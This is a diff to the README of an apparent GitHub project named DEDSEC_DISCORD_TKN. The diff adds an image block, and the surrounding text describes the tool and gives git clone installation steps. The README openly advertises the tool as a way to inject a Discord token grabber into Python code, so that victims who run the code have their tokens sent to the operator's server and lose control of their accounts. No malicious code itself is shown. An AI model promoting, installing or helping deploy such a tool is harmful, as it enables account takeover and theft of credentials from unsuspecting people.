@@ -7,6 +7,11 @@
 ## DESCRIPTION
 DISCORD_TKN has the capability to inject a token grabber into Python code. When a user executes this code, all of their Discord tokens are obtained and automatically sent to your server. With these tokens, you gain full control over their account and can manipulate it as you see fit.
 
+<h3 align="center"> TOOL SERVER BOT </h3>
+<p align="center">
+<img src="https://github.com/0xbitx/DEDSEC_DISCORD_TKN/blob/main/tool_image.png", width="500", height="500">
+</p>
+
 ## INSTALLATION 
     * git clone https://github.com/0xbitx/DEDSEC_DISCORD_TKN.git
     * cd DEDSEC_DISCORD_TKN
